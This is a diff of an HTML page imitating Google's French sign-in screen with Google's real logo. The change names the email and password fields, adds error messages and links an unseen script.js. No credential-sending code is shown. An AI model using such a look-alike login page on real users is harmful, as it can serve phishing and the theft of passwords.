@@ -11,15 +11,17 @@
         <div class="login-box">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
             <h1>Se connecter</h1>
-            <form action="#" method="post">
+            <form id="loginForm" method="post">
                 <div class="textbox">
-                    <input type="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+                    <input type="email" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+                    <p class="error-message" id="emailError"></p>
                 </div>
                 <div class="forgot-email">
                     <a href="#">Adresse e-mail oubliée ?</a>
                 </div>
                 <div class="textbox">
-                    <input type="password" placeholder="Entrez votre mot de passe" required>
+                    <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+                    <p class="error-message" id="passwordError"></p>
                 </div>
                 <div class="forgot-password">
                     <a href="#">Mot de passe oublié ?</a>
@@ -31,5 +33,6 @@
             </form>
         </div>
     </div>
+    <script src="script.js"></script>
 </body>
 </html>
